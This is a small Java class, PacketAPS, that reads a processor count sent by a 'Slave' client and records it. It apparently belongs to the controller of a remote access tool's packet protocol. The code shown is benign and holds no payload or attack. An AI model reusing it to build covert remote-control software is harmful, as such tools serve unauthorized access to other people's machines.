package com.redpois0n.packets.in;

import java.io.DataInputStream;

import com.redpois0n.Slave;

public class PacketAPS extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		short processors = slave.readShort();
		slave.setProcessors(processors);
	}

}
